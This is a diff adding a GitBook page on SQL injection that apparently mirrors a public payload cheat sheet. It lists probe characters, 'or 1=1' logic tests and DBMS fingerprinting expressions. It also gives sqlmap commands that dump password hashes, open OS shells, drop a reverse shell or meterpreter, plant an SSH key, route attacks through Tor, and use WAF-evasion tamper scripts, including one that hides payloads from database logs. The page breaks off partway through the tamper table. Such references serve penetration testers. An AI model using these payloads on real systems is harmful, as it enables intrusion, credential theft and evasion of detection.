@@ -1,0 +1,1450 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>SQL注入 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="MYSQL.md" />
+    
+    
+    <link rel="prev" href="../命令注入/" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../SUMMARY.html">
+            
+                <a href="../SUMMARY.html">
+            
+                    
+                    目录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    注入漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../命令注入/">
+            
+                <a href="../命令注入/">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.2.1" data-path="MYSQL.md">
+            
+                <span>
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.2" data-path="MSSQL.html">
+            
+                <a href="MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.3" data-path="PostgreSQL.html">
+            
+                <a href="PostgreSQL.html">
+            
+                    
+                    PostgreSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.4" data-path="SQLite.html">
+            
+                <a href="SQLite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../CRLF注入/">
+            
+                <a href="../CRLF注入/">
+            
+                    
+                    CRLF注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../LDAP注入/">
+            
+                <a href="../LDAP注入/">
+            
+                    
+                    LDAP注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../NOSQL注入/">
+            
+                <a href="../NOSQL注入/">
+            
+                    
+                    NOSQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../XPATH注入/">
+            
+                <a href="../XPATH注入/">
+            
+                    
+                    XPATH注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../SAML注入/">
+            
+                <a href="../SAML注入/">
+            
+                    
+                    SAML注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../[XML实体注入漏洞-XXE">
+            
+                <span>
+            
+                    
+                    XML实体注入漏洞-XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="../模板注入-SSTI/">
+            
+                <a href="../模板注入-SSTI/">
+            
+                    
+                    模板注入-SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    前端安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../跨站脚本攻击-XSS/">
+            
+                <a href="../跨站脚本攻击-XSS/">
+            
+                    
+                    跨站脚本攻击-XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../跨站请求伪造-CSRF/">
+            
+                <a href="../跨站请求伪造-CSRF/">
+            
+                    
+                    跨站请求伪造-CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../CORS配置错误/">
+            
+                <a href="../CORS配置错误/">
+            
+                    
+                    CORS配置错误
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../Web缓存泄露/">
+            
+                <a href="../Web缓存泄露/">
+            
+                    
+                    Web缓存泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" >
+            
+                <span>
+            
+                    
+                    权限控制
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../不安全的代码管理/">
+            
+                <a href="../不安全的代码管理/">
+            
+                    
+                    不安全的代码管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../不安全的对象引用/">
+            
+                <a href="../不安全的对象引用/">
+            
+                    
+                    不安全的对象引用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../不安全的管理接口/">
+            
+                <a href="../不安全的管理接口/">
+            
+                    
+                    不安全的管理接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" >
+            
+                <span>
+            
+                    
+                    文件相关漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../文件上传漏洞/">
+            
+                <a href="../文件上传漏洞/">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../文件包含/README.md">
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    认证方式漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../JWT安全问题/">
+            
+                <a href="../JWT安全问题/">
+            
+                    
+                    JWT安全问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../OAuth认证/">
+            
+                <a href="../OAuth认证/">
+            
+                    
+                    OAuth认证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    其他漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" data-path="../任意url跳转/">
+            
+                <a href="../任意url跳转/">
+            
+                    
+                    任意url跳转
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" data-path="../目录遍历/">
+            
+                <a href="../目录遍历/">
+            
+                    
+                    目录遍历
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" data-path="../服务端请求伪造-SSRF/">
+            
+                <a href="../服务端请求伪造-SSRF/">
+            
+                    
+                    服务端请求伪造-SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../PHP弱类型/">
+            
+                <a href="../PHP弱类型/">
+            
+                    
+                    PHP弱类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" >
+            
+                <span>
+            
+                    
+                    内网渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.2.1" data-path="../内网技巧/内网技巧.html">
+            
+                <a href="../内网技巧/内网技巧.html">
+            
+                    
+                    内网技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >SQL注入</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="sql-injection">SQL injection</h1>
+<blockquote>
+<p>A SQL injection attack consists of insertion or &quot;injection&quot; of a SQL query via the input data from the client to the application.</p>
+</blockquote>
+<p>Attempting to manipulate SQL queries may have goals including:</p>
+<ul>
+<li>Information Leakage</li>
+<li>Disclosure of stored data</li>
+<li>Manipulation of stored data</li>
+<li>Bypassing authorisation controls</li>
+</ul>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md" target="_blank">CheatSheet MSSQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" target="_blank">CheatSheet MySQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md" target="_blank">CheatSheet OracleSQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md" target="_blank">CheatSheet PostgreSQL Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank">CheatSheet SQLite Injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md" target="_blank">CheatSheet Cassandra Injection</a></li>
+<li><a href="#entry-point-detection">Entry point detection</a></li>
+<li><a href="#dbms-identification">DBMS Identification</a></li>
+<li><a href="#sql-injection-using-sqlmap">SQL injection using SQLmap</a><ul>
+<li><a href="#basic-arguments-for-sqlmap">Basic arguments for SQLmap</a></li>
+<li><a href="#load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</a></li>
+<li><a href="#custom-injection-in-useragent-header-referer-cookie">Custom injection in UserAgent/Header/Referer/Cookie</a></li>
+<li><a href="#second-order-injection">Second order injection</a></li>
+<li><a href="#shell">Shell</a></li>
+<li><a href="#crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</a></li>
+<li><a href="#using-tor-with-sqlmap">Using TOR with SQLmap</a></li>
+<li><a href="#using-a-proxy-with-sqlmap">Using a proxy with SQLmap</a></li>
+<li><a href="#using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</a></li>
+<li><a href="#using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</a></li>
+<li><a href="#general-tamper-option-and-tamper-s-list">General tamper option and tamper&apos;s list</a></li>
+</ul>
+</li>
+<li><a href="#authentication-bypass">Authentication bypass</a></li>
+<li><a href="#polyglot-injection-multicontext">Polyglot injection</a></li>
+<li><a href="#routed-injection">Routed injection</a></li>
+<li><a href="#insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</a></li>
+<li><a href="#waf-bypass">WAF Bypass</a></li>
+</ul>
+<h2 id="entry-point-detection">Entry point detection</h2>
+<p>Detection of an SQL injection entry point
+Simple characters</p>
+<pre><code class="lang-sql">&apos;
+%27
+&quot;
+%22
+#
+%23
+;
+%3B
+)
+Wildcard (*)
+&amp;apos;  # required for XML content
+</code></pre>
+<p>Multiple encoding</p>
+<pre><code class="lang-sql">%%2727
+%25%27
+</code></pre>
+<p>Merging characters</p>
+<pre><code class="lang-sql">`+HERP
+&apos;||&apos;DERP
+&apos;+&apos;herp
+&apos; &apos;DERP
+&apos;%20&apos;HERP
+&apos;%2B&apos;HERP
+</code></pre>
+<p>Logic Testing</p>
+<pre><code class="lang-sql">page.asp?id=1 or 1=1 <span class="hljs-comment">-- true</span>
+page.asp?id=1&apos; or 1=1 <span class="hljs-comment">-- true</span>
+page.asp?id=1&quot; or 1=1 <span class="hljs-comment">-- true</span>
+page.asp?id=1 and 1=2 <span class="hljs-comment">-- false</span>
+</code></pre>
+<p>Weird characters</p>
+<pre><code class="lang-sql">Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
+transformed into U+0022 QUOTATION MARK (&quot;)
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+transformed into U+0027 APOSTROPHE (&apos;)
+</code></pre>
+<h2 id="dbms-identification">DBMS Identification</h2>
+<pre><code class="lang-c">[<span class="hljs-string">&quot;conv(&apos;a&apos;,16,2)=conv(&apos;a&apos;,16,2)&quot;</span>                   ,<span class="hljs-string">&quot;MYSQL&quot;</span>],
+[<span class="hljs-string">&quot;connection_id()=connection_id()&quot;</span>                 ,<span class="hljs-string">&quot;MYSQL&quot;</span>],
+[<span class="hljs-string">&quot;crc32(&apos;MySQL&apos;)=crc32(&apos;MySQL&apos;)&quot;</span>                   ,<span class="hljs-string">&quot;MYSQL&quot;</span>],
+[<span class="hljs-string">&quot;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&quot;</span>       ,<span class="hljs-string">&quot;MSSQL&quot;</span>],
+[<span class="hljs-string">&quot;@@CONNECTIONS&gt;0&quot;</span>                                 ,<span class="hljs-string">&quot;MSSQL&quot;</span>],
+[<span class="hljs-string">&quot;@@CONNECTIONS=@@CONNECTIONS&quot;</span>                     ,<span class="hljs-string">&quot;MSSQL&quot;</span>],
+[<span class="hljs-string">&quot;@@CPU_BUSY=@@CPU_BUSY&quot;</span>                           ,<span class="hljs-string">&quot;MSSQL&quot;</span>],
+[<span class="hljs-string">&quot;USER_ID(1)=USER_ID(1)&quot;</span>                           ,<span class="hljs-string">&quot;MSSQL&quot;</span>],
+[<span class="hljs-string">&quot;ROWNUM=ROWNUM&quot;</span>                                   ,<span class="hljs-string">&quot;ORACLE&quot;</span>],
+[<span class="hljs-string">&quot;RAWTOHEX(&apos;AB&apos;)=RAWTOHEX(&apos;AB&apos;)&quot;</span>                   ,<span class="hljs-string">&quot;ORACLE&quot;</span>],
+[<span class="hljs-string">&quot;LNNVL(0=123)&quot;</span>                                    ,<span class="hljs-string">&quot;ORACLE&quot;</span>],
+[<span class="hljs-string">&quot;5::int=5&quot;</span>                                        ,<span class="hljs-string">&quot;POSTGRESQL&quot;</span>],
+[<span class="hljs-string">&quot;5::integer=5&quot;</span>                                    ,<span class="hljs-string">&quot;POSTGRESQL&quot;</span>],
+[<span class="hljs-string">&quot;pg_client_encoding()=pg_client_encoding()&quot;</span>       ,<span class="hljs-string">&quot;POSTGRESQL&quot;</span>],
+[<span class="hljs-string">&quot;get_current_ts_config()=get_current_ts_config()&quot;</span> ,<span class="hljs-string">&quot;POSTGRESQL&quot;</span>],
+[<span class="hljs-string">&quot;quote_literal(42.5)=quote_literal(42.5)&quot;</span>         ,<span class="hljs-string">&quot;POSTGRESQL&quot;</span>],
+[<span class="hljs-string">&quot;current_database()=current_database()&quot;</span>           ,<span class="hljs-string">&quot;POSTGRESQL&quot;</span>],
+[<span class="hljs-string">&quot;sqlite_version()=sqlite_version()&quot;</span>               ,<span class="hljs-string">&quot;SQLITE&quot;</span>],
+[<span class="hljs-string">&quot;last_insert_rowid()&gt;1&quot;</span>                           ,<span class="hljs-string">&quot;SQLITE&quot;</span>],
+[<span class="hljs-string">&quot;last_insert_rowid()=last_insert_rowid()&quot;</span>         ,<span class="hljs-string">&quot;SQLITE&quot;</span>],
+[<span class="hljs-string">&quot;val(cvar(1))=1&quot;</span>                                  ,<span class="hljs-string">&quot;MSACCESS&quot;</span>],
+[<span class="hljs-string">&quot;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&quot;</span>               ,<span class="hljs-string">&quot;MSACCESS&quot;</span>],
+[<span class="hljs-string">&quot;cdbl(1)=cdbl(1)&quot;</span>                                 ,<span class="hljs-string">&quot;MSACCESS&quot;</span>],
+[<span class="hljs-string">&quot;1337=1337&quot;</span>,   <span class="hljs-string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],
+[<span class="hljs-string">&quot;&apos;i&apos;=&apos;i&apos;&quot;</span>,     <span class="hljs-string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],
+</code></pre>
+<h2 id="sql-injection-using-sqlmap">SQL injection using SQLmap</h2>
+<h3 id="basic-arguments-for-sqlmap">Basic arguments for SQLmap</h3>
+<pre><code class="lang-powershell">sqlmap --url=<span class="hljs-string">&quot;&lt;url&gt;&quot;</span> -p username --user-agent=SQLMAP --random-agent --threads=<span class="hljs-number">10</span> --risk=<span class="hljs-number">3</span> --level=<span class="hljs-number">5</span> --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
+</code></pre>
+<h3 id="load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</h3>
+<pre><code class="lang-powershell">sqlmap -r sqli.req --safe-url=http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>/ --mobile --safe-freq=<span class="hljs-number">1</span>
+</code></pre>
+<h3 id="custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</h3>
+<pre><code class="lang-powershell">python sqlmap.py -u <span class="hljs-string">&quot;http://example.com&quot;</span> --data <span class="hljs-string">&quot;username=admin&amp;password=pass&quot;</span>  --headers=<span class="hljs-string">&quot;x-forwarded-for:127.0.0.1*&quot;</span>
+The injection is located at the <span class="hljs-string">&apos;*&apos;</span>
+</code></pre>
+<h3 id="second-order-injection">Second order injection</h3>
+<pre><code class="lang-powershell">python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order <span class="hljs-string">&quot;http://targetapp/wishlist&quot;</span> -v <span class="hljs-number">3</span>
+sqlmap -r <span class="hljs-number">1</span>.txt -dbms MySQL -second-order <span class="hljs-string">&quot;http://&lt;IP/domain&gt;/joomla/administrator/index.php&quot;</span> -D <span class="hljs-string">&quot;joomla&quot;</span> -dbs
+</code></pre>
+<h3 id="shell">Shell</h3>
+<pre><code class="lang-powershell">SQL Shell
+python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/?id=1&quot;</span>  -p id --sql-shell
+
+Simple Shell
+python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/?id=1&quot;</span>  -p id --os-shell
+
+Dropping a reverse-shell / meterpreter
+python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/?id=1&quot;</span>  -p id --os-pwn
+
+SSH Shell by dropping an SSH key
+python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/?id=1&quot;</span> -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
+</code></pre>
+<h3 id="crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</h3>
+<pre><code class="lang-powershell">sqlmap -u <span class="hljs-string">&quot;http://example.com/&quot;</span> --crawl=<span class="hljs-number">1</span> --random-agent --batch --forms --threads=<span class="hljs-number">5</span> --level=<span class="hljs-number">5</span> --risk=<span class="hljs-number">3</span>
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+</code></pre>
+<h3 id="using-tor-with-sqlmap">Using TOR with SQLmap</h3>
+<pre><code class="lang-powershell">sqlmap -u <span class="hljs-string">&quot;http://www.target.com&quot;</span> --tor --tor-type=SOCKS5 --time-sec <span class="hljs-number">11</span> --check-tor --level=<span class="hljs-number">5</span> --risk=<span class="hljs-number">3</span> --threads=<span class="hljs-number">5</span>
+</code></pre>
+<h3 id="using-a-proxy-with-sqlmap">Using a proxy with SQLmap</h3>
+<pre><code class="lang-powershell">sqlmap -u <span class="hljs-string">&quot;http://www.target.com&quot;</span> --proxy=<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>
+</code></pre>
+<h3 id="using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</h3>
+<pre><code class="lang-powershell">sqlmap -u <span class="hljs-string">&quot;https://test.com/index.php?id=99&quot;</span> --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>  -f  --time-sec <span class="hljs-number">15</span> --level <span class="hljs-number">3</span>
+</code></pre>
+<h3 id="using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</h3>
+<pre><code class="lang-powershell">python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/?id=1&quot;</span>  -p id --suffix=<span class="hljs-string">&quot;-- &quot;</span>
+</code></pre>
+<h3 id="general-tamper-option-and-tampers-list">General tamper option and tamper&apos;s list</h3>
+<pre><code class="lang-powershell">tamper=name_of_the_tamper
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Tamper</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x2char.py</td>
+<td>Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),&#x2026;) counterpart</hex></td>
+</tr>
+<tr>
+<td>apostrophemask.py</td>
+<td>Replaces apostrophe character with its UTF-8 full width counterpart</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>Replaces apostrophe character with its illegal double unicode counterpart</td>
+</tr>
+<tr>
+<td>appendnullbyte.py</td>
+<td>Appends encoded NULL byte character at the end of payload</td>
+</tr>
+<tr>
+<td>base64encode.py</td>
+<td>Base64 all characters in a given payload</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>Replaces greater than operator (&apos;&gt;&apos;) with &apos;NOT BETWEEN 0 AND #&apos;</td>
+</tr>
+<tr>
+<td>bluecoat.py</td>
+<td>Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator</td>
+</tr>
+<tr>
+<td>chardoubleencode.py</td>
+<td>Double url-encodes all characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54)</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054)</td>
+</tr>
+<tr>
+<td>charunicodeescape.py</td>
+<td>Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054)</td>
+</tr>
+<tr>
+<td>commalesslimit.py</td>
+<td>Replaces instances like &apos;LIMIT M, N&apos; with &apos;LIMIT N OFFSET M&apos;</td>
+</tr>
+<tr>
+<td>commalessmid.py</td>
+<td>Replaces instances like &apos;MID(A, B, C)&apos; with &apos;MID(A FROM B FOR C)&apos;</td>
+</tr>
+<tr>
+<td>commentbeforeparentheses.py</td>
+<td>Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/()</td>
+</tr>
+<tr>
+<td>concat2concatws.py</td>
+<td>Replaces instances like &apos;CONCAT(A, B)&apos; with &apos;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&apos;</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>Url-encodes all characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>equaltolike.py</td>
+<td>Replaces all occurances of operator equal (&apos;=&apos;) with operator &apos;LIKE&apos;</td>
+</tr>
+<tr>
+<td>escapequotes.py</td>
+<td>Slash escape quotes (&apos; and &quot;)</td>
+</tr>
+<tr>
+<td>greatest.py</td>
+<td>Replaces greater than operator (&apos;&gt;&apos;) with &apos;GREATEST&apos; counterpart</td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>Adds versioned MySQL comment before each keyword</td>
+</tr>
+<tr>
+<td>htmlencode.py</td>
+<td>HTML encode (using code points) all non-alphanumeric characters (e.g. &#x2018; -&gt; &apos;)</td>
+</tr>
+<tr>
+<td>ifnull2casewhenisnull.py</td>
+<td>Replaces instances like &#x2018;IFNULL(A, B)&#x2019; with &#x2018;CASE WHEN ISNULL(A) THEN (B) ELSE (A) END&#x2019; counterpart</td>
+</tr>
+<tr>
+<td>ifnull2ifisnull.py</td>
+<td>Replaces instances like &apos;IFNULL(A, B)&apos; with &apos;IF(ISNULL(A), B, A)&apos;</td>
+</tr>
+<tr>
+<td>informationschemacomment.py</td>
+<td>Add an inline comment (/**/) to the end of all occurrences of (MySQL) &#x201C;information_schema&#x201D; identifier</td>
+</tr>
+<tr>
+<td>least.py</td>
+<td>Replaces greater than operator (&#x2018;&gt;&#x2019;) with &#x2018;LEAST&#x2019; counterpart</td>
+</tr>
+<tr>
+<td>lowercase.py</td>
+<td>Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</td>
+</tr>
+<tr>
+<td>modsecurityversioned.py</td>
+<td>Embraces complete query with versioned comment</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned.py</td>
+<td>Embraces complete query with zero-versioned comment</td>
+</tr>
+<tr>
+<td>multiplespaces.py</td>
+<td>Adds multiple spaces around SQL keywords</td>
+</tr>
+<tr>
+<td>nonrecursivereplacement.py</td>
+<td>Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&quot;SELECT&quot;, &quot;&quot;)) filters</td>
+</tr>
+<tr>
+<td>overlongutf8.py</td>
+<td>Converts all characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>overlongutf8more.py</td>
+<td>Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td>Adds a percentage sign (&apos;%&apos;) infront of each character</td>
+</tr>
+<tr>
+<td>plus2concat.py</td>
+<td>Replaces plus operator (&#x2018;+&#x2019;) with (MsSQL) function CONCAT() counterpart</td>
+</tr>
+<tr>
+<td>plus2fnconcat.py</td>
+<td>Replaces plus operator (&#x2018;+&#x2019;) with (MsSQL) ODBC function {fn CONCAT()} counterpart</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>Replaces each keyword character with random case value</td>
+</tr>
+<tr>
+<td>randomcomments.py</td>
+<td>Add random comments to SQL keywords</td>
+</tr>
+<tr>
+<td>securesphere.py</td>
+<td>Appends special crafted string</td>
+</tr>
+<tr>
+<td>sp_password.py</td>
+<td>Appends &apos;sp_password&apos; to the end of the payload for automatic obfuscation from DBMS logs</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>Replaces space character (&apos; &apos;) with comments</td>
+</tr>
+<tr>
+<td>space2dash.py</td>
+<td>Replaces space character (&apos; &apos;) with a dash comment (&apos;--&apos;) followed by a random string and a new line (&apos;\n&apos;)</td>
+</tr>
+<tr>
+<td>space2hash.py</td>
+<td>Replaces space character (&apos; &apos;) with a pound character (&apos;#&apos;) followed by a random string and a new line (&apos;\n&apos;)</td>
+</tr>
+<tr>
+<td>space2morehash.py</td>
+<td>Replaces space character (&apos; &apos;) with a pound character (&apos;#&apos;) followed by a random string and a new line (&apos;\n&apos;)</td>
+</tr>
+<tr>
+<td>space2mssqlblank.py</td>
+<td>Replaces space character (&apos; &apos;) with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>Replaces space character (&apos; &apos;) with a pound character (&apos;#&apos;) followed by a new line (&apos;\n&apos;)</td>
+</tr>
+<tr>
+<td>space2mysqlblank.py</td>
+<td>Replaces space character (&apos; &apos;) with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
